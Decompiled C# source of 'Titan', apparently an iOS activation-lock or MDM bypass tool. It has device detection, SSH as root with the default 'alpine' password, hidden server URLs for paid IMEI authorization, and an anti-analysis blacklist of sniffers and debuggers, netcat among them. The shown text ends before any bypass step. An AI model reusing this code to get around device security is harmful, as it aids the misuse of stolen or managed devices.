#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Core;
using Downloader;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using LibUsbDotNet.DeviceNotify;
using Microsoft.Toolkit.Uwp.Notifications;
using Renci.SshNet;
using Titan.Enumerates;
using Titan.Event;
using Titan.Properties;

namespace Titan
{
	public class Form1 : Form
	{
		private delegate void SetTextCallback(string text, Color color, string additionalText);

		public const int WM_NCLBUTTONDOWN = 161;

		public const int HT_CAPTION = 2;

		public static bool bool_1 = true;

		public static string ToolDir = Directory.GetCurrentDirectory();

		public static IDeviceNotifier UsbDeviceNotifier = DeviceNotifier.OpenDeviceNotifier();

		public static string UniqueDeviceIDGET;

		public static string UniqueChipIDGET;

		public iOSDeviceManager manager = new iOSDeviceManager();

		public iOSDevice currentiOSDevice;

		public SshClient Ssh = new SshClient("127.0.0.1", 22, "root", "alpine");

		public ScpClient Scp = new ScpClient("127.0.0.1", 22, "root", "alpine");

		private static readonly HttpClient httpClient = new HttpClient();

		private static readonly HttpClient client = new HttpClient();

		private System.Threading.Timer timer2;

		private bool alertShown;

		private bool processKilled;

		private List<string> blacklist = new List<string>
		{
			"fiddler", "wireshark", "charles", "httpdebuggerui", "burp", "proxyman", "tcpview", "packetcapture", "networkminer", "tcpdump",
			"netsniffer", "mitmproxy", "ettercap", "zap", "dsniff", "iptrace", "tcpmonitor", "netcat", "aircrack-ng", "tshark",
			"netsleuth", "commview", "kismet", "airodump-ng", "p0f", "snoop", "xplico", "decodet", "hexinject", "postman",
			"snort", "openvas", "nessus", "nmap", "zenmap", "nikto", "recon-ng", "hping", "masscan", "pingplotter",
			"angryip", "intercepter-ng", "netspot", "dnspy", "dnspyex", "proximan", "ollydbg", "x64dbg", "immunitydebugger", "idapro",
			"hexrays", "hopper", "jeb", "ghidra", "binaryninja", "frida", "radare2", "gdb", "edb", "windbg",
			"debugger", "dtrace", "strace", "lldb", "cutter", "patchdiff2", "valgrind", "qiling", "rr", "peda",
			"kdbg", "paranoidfish", "unicorn", "bochs", "retdec", "rizin"
		};

		private DateTime startTime;

		private bool isDownloading;

		private string downloadError;

		private int lastProgress;

		private readonly object uiUpdateLocker = new object();

		public static readonly string RutaMDM = Path.Combine(ToolDir, "Backup", "swp");

		public static readonly string RutaMDMUnzip = Path.Combine(RutaMDM, "ffe2017db9c5071adfa1c23d3769970f7524a9d4");

		public string OTADir = Path.Combine(ToolDir, "OTA", "swp") + "\\ad09186179f31a88dd6ee2c8f2d034025f54c82a";

		public string TMPPatchOTA = Path.Combine(ToolDir, "OTA", "swp") + "\\ad09186179f31a88dd6ee2c8f2d034025f54c82a";

		public static string RutaOTA = Path.Combine(ToolDir, "OTA", "swp");

		private int totalProgress;

		private IContainer components;

		internal PictureBox pictureBoxModel;

		private PictureBox pictureBox2;

		private PictureBox pictureBox3;

		private PictureBox pictureBox8;

		private Label labelType;

		private Label labelVersion;

		private Label labelSN;

		private Label ModeloffHello;

		private Label label15;

		private Label label16;

		private Label label20;

		private Label label23;

		internal PictureBox pictureBoxDC;

		private Guna2CircleButton guna2CircleButton1;

		private Guna2CircleButton guna2CircleButton2;

		private Guna2GradientPanel guna2GradientPanel3;

		private Guna2Elipse guna2Elipse1;

		private PictureBox pictureBox6;

		private Guna2Panel guna2Panel1;

		internal PictureBox pictureBox20;

		internal Guna2GradientButton guna2GradientButton3;

		internal PictureBox pictureBox1;

		internal Label labelInfoProgres;

		private Label Label10;

		private Label label24;

		internal Guna2Separator Guna2Separator2;

		internal Guna2ProgressBar Guna2ProgressBar1;

		internal PictureBox pictureBox4;

		internal Guna2GradientButton guna2GradientButton1;

		internal Guna2GradientButton ActivateButton;

		internal Label label1;

		internal Guna2Separator Guna2Separator1;

		internal Guna2GradientButton guna2GradientButton2;

		internal Label label2;

		internal PictureBox pictureBox5;

		internal Label label3;

		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		[DllImport("kernel32.dll")]
		private static extern bool IsDebuggerPresent();

		public Form1()
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Expected O, but got Unknown
			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
			//IL_0043: Expected O, but got Unknown
			//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
			//IL_0403: Expected O, but got Unknown
			InitializeComponent();
			((Form)this).FormClosing += new FormClosingEventHandler(Form1_FormClosing);
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			((Form)this).FormBorderStyle = (FormBorderStyle)0;
			DropShadow dropShadow = new DropShadow();
			dropShadow.ApplyShadowsAndRoundedCorners((Form)(object)this, 7);
			DropShadow.MakeFormDraggable((Form)(object)this);
			InitializeFormSettings();
			InitializeEventHandlers();
			InitializeSecurityTimer();
			StartDeviceListener();
			CheckVersionAsync();
			((Control)pictureBoxModel).SendToBack();
		}

		private void InitializeFormSettings()
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected O, but got Unknown
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Expected O, but got Unknown
			((Form)this).FormBorderStyle = (FormBorderStyle)0;
			((Control)this).MouseDown += new MouseEventHandler(Form1_MouseDown);
			((Control)guna2GradientPanel3).MouseDown += new MouseEventHandler(panel1_MouseDown);
			this.DoubleBuffered = true;
		}

		private void InitializeEventHandlers()
		{
			manager.CommonConnectEvent += CommonConnectDevice;
			manager.RecoveryConnectEvent += RecoveryConnectDevice;
			manager.ListenErrorEvent += ListenError;
		}

		private void InitializeSecurityTimer()
		{
			timer2 = new System.Threading.Timer(DetectEavesdroppingApps, null, 0, 2000);
		}

		private void StartDeviceListener()
		{
			Thread thread = new Thread(manager.StartListen);
			thread.IsBackground = true;
			thread.Start();
		}

		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Invalid comparison between Unknown and I4
			if ((int)e.Button == 1048576)
			{
				ReleaseCapture();
				SendMessage(((Control)this).Handle, 161, 2, 0);
			}
		}

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Invalid comparison between Unknown and I4
			if ((int)e.Button == 1048576)
			{
				ReleaseCapture();
				SendMessage(((Control)this).Handle, 161, 2, 0);
			}
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			CloseExitAPP("idevicebackup");
			CloseExitAPP("idevicebackup2");
			CloseExitAPP("iproxy");
			CloseExitAPP("ideviceinfo");
		}

		private bool IsAdministrator()
		{
			WindowsIdentity identity = WindowsIdentity.GetCurrent();
			WindowsPrincipal principal = new WindowsPrincipal(identity);
			return principal.IsInRole(WindowsBuiltInRole.Administrator);
		}

		private bool IsDebugging()
		{
			return false;
		}

		private void DetectEavesdroppingApps(object state)
		{
			if (!IsDebugging())
			{
				IsProxyEnabled();
			}
		}

		private void HandleSecurityViolation(string reason)
		{
			Debug.WriteLine("Security violation ignored");
		}

		private bool IsProxyEnabled()
		{
			return false;
		}

		private bool IsFiddlerOrProxymanRunning()
		{
			return false;
		}

		private bool IsProxyInBrowser()
		{
			return false;
		}

		private string GetChromeProxySettings()
		{
			return "No proxy settings found in Chrome.";
		}

		private string GetFirefoxProxySettings()
		{
			return "ERROR";
		}

		private string GetMacAddress()
		{
			return "ERROR";
		}

		private string GetLocalIPAddress()
		{
			return "0.0.0.0";
		}

		private string GetToolip()
		{
			return "ERROR";
		}

		private async void CheckVersionAsync()
		{
			string versionUrl = H1010X9191("aHR0cHM6Ly9pLXJlYWxtLnByby92ZXJzaW9uX3Rvb2wucGhw");
			try
			{
				HttpClient httpClient = new HttpClient();
				try
				{
					httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
					string serverVersionString = (await httpClient.GetStringAsync(versionUrl)).Trim();
					Version serverVersion = new Version(serverVersionString);
					Version toolVersion = new Version("1.3");
					int comparisonResult = serverVersion.CompareTo(toolVersion);
					if (comparisonResult != 0)
					{
						string message = ((comparisonResult > 0) ? ("The tool is outdated. Please update to version " + serverVersionString + ".") : ("The server is under maintenance. Please check for updates to the tool. Server version: " + serverVersionString + "."));
						((Control)this).Invoke((Delegate)(MethodInvoker)delegate
						{
							//IL_0018: Unknown result type (might be due to invalid IL or missing references)
							//IL_001d: Unknown result type (might be due to invalid IL or missing references)
							DialogResult val2 = MessageBox.Show(message + " Do you want to update the tool?", "Notification", (MessageBoxButtons)4, (MessageBoxIcon)64);
						});
					}
				}
				finally
				{
					((IDisposable)httpClient)?.Dispose();
				}
			}
			catch (HttpRequestException)
			{
			}
			catch (Exception)
			{
			}
		}

		private void HandleVersionCheckError(string message, string title)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			((Control)this).Invoke((Delegate)(MethodInvoker)delegate
			{
				//IL_000f: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show(message, title, (MessageBoxButtons)0, (MessageBoxIcon)16);
			});
		}

		private void ListenError(object sender, ListenErrorEventHandlerEventArgs args)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			if (args.ErrorType == ListenErrorEventType.StartListen)
			{
				string errorMessage = args.ErrorMessage;
				MessageBox.Show("iTunes is not installed on this system.\n\niTunes is required for this software to function properly.\n\nYou can download iTunes from:\n• Apple's official website\n• Microsoft Store\n• 3uTools\n• Or any other trusted source", "iTunes Required", (MessageBoxButtons)0, (MessageBoxIcon)48);
				Application.Exit();
			}
		}

		private async void CommonConnectDevice(object sender, DeviceCommonConnectEventArgs args)
		{
			if (args.Message == ConnectNotificationMessage.Connected)
			{
				currentiOSDevice = args.Device;
				((Control)this).Invoke((Delegate)(Action)async delegate
				{
					await HandleDeviceConnected();
				});
			}
			else if (args.Message == ConnectNotificationMessage.Disconnected)
			{
				((Control)this).Invoke((Delegate)(Action)delegate
				{
					HandleDeviceDisconnected();
				});
			}
		}

		private async Task HandleDeviceConnected()
		{
			((Control)pictureBoxDC).SendToBack();
			((Control)pictureBoxDC).Visible = false;
			float zoomFactor = 2f;
			await LoadImageWithZoomAsync(zoomFactor);
			UpdateDeviceModel();
			UpdateDeviceInfo();
			await ShowElementsAsync();
		}

		private void HandleDeviceDisconnected()
		{
			HideElements();
			((Control)pictureBoxDC).BringToFront();
			((Control)pictureBoxDC).Visible = true;
			((Control)this).Show();
		}

		private void UpdateDeviceModel()
		{
			switch (currentiOSDevice.ProductType)
			{
			case "iPhone6,1":
			case "iPhone6,2":
				((Control)ModeloffHello).Text = "iPhone 5S";
				break;
			case "iPhone7,2":
				((Control)ModeloffHello).Text = "iPhone 6";
				break;
			case "iPhone7,1":
				((Control)ModeloffHello).Text = "iPhone 6 Plus";
				break;
			case "iPhone8,1":
				((Control)ModeloffHello).Text = "iPhone 6S";
				break;
			case "iPhone8,2":
				((Control)ModeloffHello).Text = "iPhone 6S Plus";
				break;
			case "iPhone8,4":
				((Control)ModeloffHello).Text = "iPhone SE";
				break;
			case "iPhone9,1":
			case "iPhone9,3":
				((Control)ModeloffHello).Text = "iPhone 7";
				break;
			case "iPhone9,2":
			case "iPhone9,4":
				((Control)ModeloffHello).Text = "iPhone 7 Plus";
				break;
			case "iPhone10,1":
			case "iPhone10,4":
				((Control)ModeloffHello).Text = "iPhone 8";
				break;
			case "iPhone10,2":
			case "iPhone10,5":
				((Control)ModeloffHello).Text = "iPhone 8 Plus";
				break;
			case "iPhone10,3":
			case "iPhone10,6":
				((Control)ModeloffHello).Text = "iPhone X";
				break;
			case "iPhone11,2":
				((Control)ModeloffHello).Text = "iPhone Xs";
				break;
			case "iPhone11,4":
			case "iPhone11,6":
				((Control)ModeloffHello).Text = "iPhone Xs Max";
				break;
			case "iPhone11,8":
				((Control)ModeloffHello).Text = "iPhone Xr";
				break;
			case "iPhone12,1":
				((Control)ModeloffHello).Text = "iPhone 11";
				break;
			case "iPhone12,3":
				((Control)ModeloffHello).Text = "iPhone 11 Pro";
				break;
			case "iPhone12,5":
				((Control)ModeloffHello).Text = "iPhone 11 Pro Max";
				break;
			case "iPhone12,8":
				((Control)ModeloffHello).Text = "iPhone SE 2";
				break;
			case "iPhone13,1":
				((Control)ModeloffHello).Text = "iPhone 12 mini";
				break;
			case "iPhone13,2":
				((Control)ModeloffHello).Text = "iPhone 12";
				break;
			case "iPhone13,3":
				((Control)ModeloffHello).Text = "iPhone 12 Pro";
				break;
			case "iPhone13,4":
				((Control)ModeloffHello).Text = "iPhone 12 Pro Max";
				break;
			case "iPhone14,4":
				((Control)ModeloffHello).Text = "iPhone 13 mini";
				break;
			case "iPhone14,5":
				((Control)ModeloffHello).Text = "iPhone 13";
				break;
			case "iPhone14,2":
				((Control)ModeloffHello).Text = "iPhone 13 Pro";
				break;
			case "iPhone14,3":
				((Control)ModeloffHello).Text = "iPhone 13 Pro Max";
				break;
			case "iPhone14,6":
				((Control)ModeloffHello).Text = "iPhone SE 3";
				break;
			case "iPhone14,7":
				((Control)ModeloffHello).Text = "iPhone 14";
				break;
			case "iPhone14,8":
				((Control)ModeloffHello).Text = "iPhone 14 Plus";
				break;
			case "iPhone15,2":
				((Control)ModeloffHello).Text = "iPhone 14 Pro";
				break;
			case "iPhone15,3":
				((Control)ModeloffHello).Text = "iPhone 14 Pro Max";
				break;
			case "iPhone15,4":
				((Control)ModeloffHello).Text = "iPhone 15";
				break;
			case "iPhone15,5":
				((Control)ModeloffHello).Text = "iPhone 15 Plus";
				break;
			case "iPhone16,1":
				((Control)ModeloffHello).Text = "iPhone 15 Pro";
				break;
			case "iPhone16,2":
				((Control)ModeloffHello).Text = "iPhone 15 Pro Max";
				break;
			case "iPhone17,3":
				((Control)ModeloffHello).Text = "iPhone 16";
				break;
			case "iPhone17,4":
				((Control)ModeloffHello).Text = "iPhone 16 Plus";
				break;
			case "iPhone17,1":
				((Control)ModeloffHello).Text = "iPhone 16 Pro";
				break;
			case "iPhone17,2":
				((Control)ModeloffHello).Text = "iPhone 16 Pro Max";
				break;
			case "iPad2,1":
			case "iPad2,2":
			case "iPad2,3":
			case "iPad2,4":
				((Control)ModeloffHello).Text = "iPad 2";
				break;
			case "iPad3,1":
			case "iPad3,2":
			case "iPad3,3":
				((Control)ModeloffHello).Text = "iPad 3";
				break;
			case "iPad3,4":
			case "iPad3,5":
			case "iPad3,6":
				((Control)ModeloffHello).Text = "iPad 4";
				break;
			case "iPad6,11":
			case "iPad6,12":
				((Control)ModeloffHello).Text = "iPad 5";
				break;
			case "iPad7,5":
			case "iPad7,6":
				((Control)ModeloffHello).Text = "iPad 6";
				break;
			case "iPad7,11":
			case "iPad7,12":
				((Control)ModeloffHello).Text = "iPad 7";
				break;
			case "iPad11,6":
			case "iPad11,7":
				((Control)ModeloffHello).Text = "iPad 8";
				break;
			case "iPad12,1":
			case "iPad12,2":
				((Control)ModeloffHello).Text = "iPad 9";
				break;
			case "iPad13,18":
			case "iPad13,19":
				((Control)ModeloffHello).Text = "iPad 10";
				break;
			case "iPad4,1":
			case "iPad4,2":
			case "iPad4,3":
				((Control)ModeloffHello).Text = "iPad Air";
				break;
			case "iPad5,3":
			case "iPad5,4":
				((Control)ModeloffHello).Text = "iPad Air 2";
				break;
			case "iPad11,3":
			case "iPad11,4":
				((Control)ModeloffHello).Text = "iPad Air 3";
				break;
			case "iPad13,1":
			case "iPad13,2":
				((Control)ModeloffHello).Text = "iPad Air 4";
				break;
			case "iPad13,16":
			case "iPad13,17":
				((Control)ModeloffHello).Text = "iPad Air 5";
				break;
			case "iPad14,8":
			case "iPad14,9":
				((Control)ModeloffHello).Text = "iPad Air 11-inch (M2)";
				break;
			case "iPad14,10":
			case "iPad14,11":
				((Control)ModeloffHello).Text = "iPad Air 13-inch (M2)";
				break;
			case "iPad2,5":
			case "iPad2,6":
			case "iPad2,7":
				((Control)ModeloffHello).Text = "iPad Mini";
				break;
			case "iPad4,4":
			case "iPad4,5":
			case "iPad4,6":
				((Control)ModeloffHello).Text = "iPad Mini 2";
				break;
			case "iPad4,7":
			case "iPad4,8":
			case "iPad4,9":
				((Control)ModeloffHello).Text = "iPad Mini 3";
				break;
			case "iPad5,1":
			case "iPad5,2":
				((Control)ModeloffHello).Text = "iPad Mini 4";
				break;
			case "iPad11,1":
			case "iPad11,2":
				((Control)ModeloffHello).Text = "iPad Mini 5";
				break;
			case "iPad14,1":
			case "iPad14,2":
				((Control)ModeloffHello).Text = "iPad Mini 6";
				break;
			case "iPad6,3":
			case "iPad6,4":
				((Control)ModeloffHello).Text = "iPad Pro 9.7-inch";
				break;
			case "iPad7,3":
			case "iPad7,4":
				((Control)ModeloffHello).Text = "iPad Pro 10.5-inch";
				break;
			case "iPad8,1":
			case "iPad8,2":
			case "iPad8,3":
			case "iPad8,4":
				((Control)ModeloffHello).Text = "iPad Pro 11-inch";
				break;
			case "iPad8,9":
			case "iPad8,10":
				((Control)ModeloffHello).Text = "iPad Pro 11-inch 2";
				break;
			case "iPad13,4":
			case "iPad13,5":
			case "iPad13,6":
			case "iPad13,7":
				((Control)ModeloffHello).Text = "iPad Pro 11-inch 3";
				break;
			case "iPad14,3":
			case "iPad14,4":
				((Control)ModeloffHello).Text = "iPad Pro 11-inch (M2)";
				break;
			case "iPad16,3":
			case "iPad16,4":
				((Control)ModeloffHello).Text = "iPad Pro 11-inch (M4)";
				break;
			case "iPad6,7":
			case "iPad6,8":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch";
				break;
			case "iPad7,1":
			case "iPad7,2":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch 2";
				break;
			case "iPad8,5":
			case "iPad8,6":
			case "iPad8,7":
			case "iPad8,8":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch 3";
				break;
			case "iPad8,11":
			case "iPad8,12":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch 4";
				break;
			case "iPad13,8":
			case "iPad13,9":
			case "iPad13,10":
			case "iPad13,11":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch 5";
				break;
			case "iPad14,5":
			case "iPad14,6":
				((Control)ModeloffHello).Text = "iPad Pro 12.9-inch (M2)";
				break;
			case "iPad16,5":
			case "iPad16,6":
				((Control)ModeloffHello).Text = "iPad Pro 13-inch (M4)";
				break;
			case "iPod4,1":
				((Control)ModeloffHello).Text = "iPod Touch 4";
				break;
			case "iPod5,1":
				((Control)ModeloffHello).Text = "iPod Touch 5";
				break;
			case "iPod7,1":
				((Control)ModeloffHello).Text = "iPod Touch 6";
				break;
			case "iPod9,1":
				((Control)ModeloffHello).Text = "iPod Touch 7";
				break;
			default:
				((Control)ModeloffHello).Text = "Unknown Model";
				pictureBoxModel.Image = (Image)Titan.Properties.Resources.device_recovery;
				break;
			}
		}

		private void UpdateDeviceInfo()
		{
			((Control)labelVersion).Text = currentiOSDevice.ProductVersion;
			((Control)labelSN).Text = currentiOSDevice.SerialNumber;
			((Control)labelType).Text = currentiOSDevice.ProductType;
		}

		private void RecoveryConnectDevice(object sender, DeviceRecoveryConnectEventArgs args)
		{
			if (args.Message == ConnectNotificationMessage.Connected)
			{
				((Control)this).Invoke((Delegate)(Action)delegate
				{
				});
			}
			else if (args.Message == ConnectNotificationMessage.Disconnected)
			{
				((Control)this).Invoke((Delegate)(Action)delegate
				{
				});
			}
		}

		private async Task LoadImageWithZoomAsync(float zoomFactor)
		{
			string typeIMG = (currentiOSDevice.ProductType.Contains("iPad") ? "iPad" : "iPhone");
			string imageUrl = "https://statici.icloud.com/fmipmobile/deviceImages-9.0/" + typeIMG + "/" + currentiOSDevice.ProductType + "/online-infobox__3x.png";
			try
			{
				HttpClient httpClient = new HttpClient();
				try
				{
					using MemoryStream stream = new MemoryStream(await httpClient.GetByteArrayAsync(imageUrl));
					Image image = Image.FromStream(stream);
					int baseWidth = 150;
					int baseHeight = 100;
					float aspectRatio = (float)image.Width / (float)image.Height;
					int newWidth = (int)((float)baseWidth * zoomFactor);
					int newHeight = (int)((float)baseHeight * zoomFactor);
					if (newWidth > ((Form)this).ClientSize.Width)
					{
						newWidth = ((Form)this).ClientSize.Width;
						newHeight = (int)((float)newWidth / aspectRatio);
					}
					if (newHeight > ((Form)this).ClientSize.Height)
					{
						newHeight = ((Form)this).ClientSize.Height;
						newWidth = (int)((float)newHeight * aspectRatio);
					}
					((Control)pictureBoxModel).Size = new Size(newWidth, newHeight);
					pictureBoxModel.SizeMode = (PictureBoxSizeMode)3;
					pictureBoxModel.Image = (Image)new Bitmap(image, new Size(newWidth, newHeight));
					((Control)pictureBoxModel).Location = new Point(-70, 5);
				}
				finally
				{
					((IDisposable)httpClient)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("No se pudo cargar la imagen" + ex.Message);
			}
		}

		public async Task ShowElementsAsync()
		{
			await Task.Run(delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Expected O, but got Unknown
				((Control)ModeloffHello).Invoke((Delegate)(MethodInvoker)delegate
				{
					((Control)ModeloffHello).Visible = true;
				});
			});
		}

		public async Task HideElements()
		{
			await Task.Run(delegate
			{
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Expected O, but got Unknown
				((Control)ModeloffHello).Invoke((Delegate)(MethodInvoker)delegate
				{
					((Control)ModeloffHello).Visible = false;
				});
			});
		}

		private void ClearTxtLog()
		{
			((Control)labelInfoProgres).Text = string.Empty;
		}

		private async void InsertLabelText(string text, Color color, string additionalText = "")
		{
			if (((Control)labelInfoProgres).InvokeRequired)
			{
				((Control)this).Invoke((Delegate)new Action<string, Color, string>(InsertLabelText), new object[3] { text, color, additionalText });
			}
			else
			{
				((Control)labelInfoProgres).ForeColor = color;
				if (!string.IsNullOrEmpty(additionalText))
				{
					((Control)labelInfoProgres).Text = text + additionalText;
				}
				else
				{
					((Control)labelInfoProgres).Text = text;
				}
			}
		}

		public void MostrarNotificacion(string contenido)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			string titulo = "⚡ Notification \ud83d\udce7";
			new ToastContentBuilder().AddText(titulo, (AdaptiveTextStyle?)null, (bool?)null, (int?)null, (int?)null, (AdaptiveTextAlign?)null, (string)null).AddText(contenido, (AdaptiveTextStyle?)null, (bool?)null, (int?)null, (int?)null, (AdaptiveTextAlign?)null, (string)null).Show();
		}

		public void Pair()
		{
			//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
			string archFolder = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86");
			Process proceso = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = archFolder + "\\idevicepair.exe",
					Arguments = "pair",
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true
				}
			};
			proceso.Start();
			StreamReader outputReader = proceso.StandardOutput;
			StreamReader errorReader = proceso.StandardError;
			string output = outputReader.ReadToEnd();
			string error = errorReader.ReadToEnd();
			proceso.WaitForExit();
			string uniqueDeviceID = currentiOSDevice.UniqueDeviceID;
			if (!output.Contains("SUCCESS: Paired with device " + uniqueDeviceID) && !error.Contains("passcode is set"))
			{
				MessageBox.Show("Please disable the passcode on your device and accept the trust dialog!", "PAIR DEVICE", (MessageBoxButtons)0, (MessageBoxIcon)48);
				Pair();
			}
		}

		public async Task<string> SerialCheckingPRO(string imei)
		{
			try
			{
				Console.WriteLine("[DEBUG] Iniciando SerialCheckingPRO con IMEI: " + imei);
				string serialNumber = currentiOSDevice.SerialNumber;
				Console.WriteLine("[DEBUG] Serial Number: " + serialNumber);
				string buildVersion = currentiOSDevice.BuildVersion;
				Console.WriteLine("[DEBUG] Build Version: " + buildVersion);
				string cf_token = "Bj/SoPr5p5XNWp9b6q3CxFp3Wm9VbnR3UmthdW1QbWhvMFo1QXBPTzBUYUhDOXd0MFg2VHhDZ2Y4MHM2ai9uLy9XbXp5MU8vUVQ2K2lsUDg=";
				Console.WriteLine("[DEBUG] Token: " + cf_token);
				string decodedUrl = H1010X9191("aHR0cHM6Ly9pLXJlYWxtLnByby9waHBfYXBpL1ZhbGlkYXRvci5waHA/aW1laT0=");
				Console.WriteLine("[DEBUG] URL Decodificada: " + decodedUrl);
				string url = decodedUrl + Uri.EscapeDataString(imei) + "&signature=" + Uri.EscapeDataString(cf_token);
				Console.WriteLine("[DEBUG] URL Completa: " + url);
				Console.WriteLine("[DEBUG] Realizando petición HTTP...");
				string response = await httpClient.GetStringAsync(url);
				Console.WriteLine("[DEBUG] Respuesta cruda del servidor: '" + response + "'");
				response = response.Trim();
				Console.WriteLine("[DEBUG] Respuesta después de Trim(): '" + response + "'");
				switch (response)
				{
				case "AUTHORIZED":
				case "NOT_AUTHORIZED":
				case "UNDER_PROCESS":
					Console.WriteLine("[DEBUG] Respuesta válida detectada: " + response);
					return response;
				default:
					if (response.Contains("Access denied") || response.Contains("Invalid signature"))
					{
						Console.WriteLine("[DEBUG] Error de acceso detectado en respuesta: " + response);
						return "NOT_AUTHORIZED";
					}
					Console.WriteLine("[DEBUG] Respuesta no reconocida, retornando NOT_AUTHORIZED. Respuesta: " + response);
					return "NOT_AUTHORIZED";
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[ERROR] Error checking serial status: " + ex.Message);
				Console.WriteLine("[ERROR] StackTrace: " + ex.StackTrace);
				if (ex.InnerException != null)
				{
					Console.WriteLine("[ERROR] InnerException: " + ex.InnerException!.Message);
				}
				return "NOT_AUTHORIZED";
			}
		}

		public async Task Encryptation()
		{
			await Task.Run(async delegate
			{
				using Process process1 = new Process();
				process1.StartInfo.UseShellExecute = false;
				process1.StartInfo.CreateNoWindow = true;
				process1.StartInfo.RedirectStandardOutput = true;
				process1.StartInfo.RedirectStandardError = true;
				string archFolder = (Environment.Is64BitOperatingSystem ? "win-x64" : "win-x86");
				process1.StartInfo.FileName = Path.Combine(Directory.GetCurrentDirectory(), archFolder, "idevicebackup2.exe");
				process1.StartInfo.Arguments = "-i encryption on 123";
				process1.OutputDataReceived += async delegate(object sender, DataReceivedEventArgs e)
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						Console.WriteLine(e.Data);
						if ((e.Data!.Contains("ERROR: Backup encryption is already enabled. Aborting.") || e.Data!.StartsWith("Error: ")) && !processKilled)
						{
							await KillProcess("idevicebackup2.exe");
							processKilled = true;
						}
					}
				};
				process1.Start();
				process1.BeginOutputReadLine();
				process1.WaitForExit();
			});
		}

		public void StartIproxy()
		{
			string basePath = Path.Combine(ToolDir);
			string proxyPath = (Environment.Is64BitOperatingSystem ? Path.Combine(basePath, "x64", "iproxy.exe") : Path.Combine(basePath, "x86", "iproxy.exe"));
			if (!File.Exists(proxyPath))
			{
				throw new FileNotFoundException("No se encontró el archivo: " + proxyPath);
			}
			Process[] existingProcesses = Process.GetProcessesByName("iproxy");
			if (Enumerable.Any(existingProcesses))
			{
				Console.WriteLine("iProxy ya está en ejecución.");
				return;
			}
			Process proceso = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = proxyPath,
					Arguments = "22 44",
					UseShellExecute = false,
					CreateNoWindow = true,
					RedirectStandardOutput = true,
					RedirectStandardError = true
				}
			};
			proceso.OutputDataReceived += delegate(object sender, DataReceivedEventArgs args)
			{
				if (!string.IsNullOrEmpty(args.Data))
				{
					Console.WriteLine("[iProxy-Output]: " + args.Data);
				}
			};
			proceso.ErrorDataReceived += delegate(object sender, DataReceivedEventArgs args)
			{
				if (!string.IsNullOrEmpty(args.Data))
				{
					Console.WriteLine("[iProxy-Error]: " + args.Data);
				}
			};
			try
			{
				proceso.Start();
				Console.WriteLine("iProxy está iniciándose...");
				proceso.BeginOutputReadLine();
				proceso.BeginErrorReadLine();
				Console.WriteLine("iProxy se está ejecutando en segundo plano.");
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error al iniciar iProxy: " + ex.Message);
			}
		}

		private void TerminateIproxyProcesses()
		{
			try
			{
				Process[] iproxyProcesses = Process.GetProcessesByName("iproxy");
				Process[] array = iproxyProcesses;
				foreach (Process process in array)
				{
					try
					{
						process.Kill();
						process.WaitForExit();
						Console.WriteLine("Proceso " + process.ProcessName + " terminado.");
					}
					catch (Exception ex2)
					{
						Console.WriteLine("No se pudo terminar el proceso " + process.ProcessName + ": " + ex2.Message);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error al buscar procesos iproxy: " + ex.Message);
			}
		}

		public bool UploadResource(byte[] resource, string remoteFilePath)
		{
			try
			{
				if (!((BaseClient)Scp).IsConnected)
				{
					((BaseClient)Scp).Connect();
				}
				MemoryStream stream = new MemoryStream(resource);
				Scp.Upload((Stream)stream, remoteFilePath);
				return true;
			}
			catch (Exception ex)
			{
				throw new ApplicationException("Error Upload Resource File" + ex.Message);
			}
		}

		public async Task<bool> CheckJailbreak()
		{
			try
			{
				Console.WriteLine("[DEBUG] ========== INICIANDO CheckJailbreak ==========");
				Console.WriteLine($"[DEBUG] Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
				bool isConnected;
				try
				{
					Console.WriteLine("[DEBUG] Iniciando iProxy...");
					StartIproxy();
					Console.WriteLine("[DEBUG] iProxy iniciado. Probando conexión SSH...");
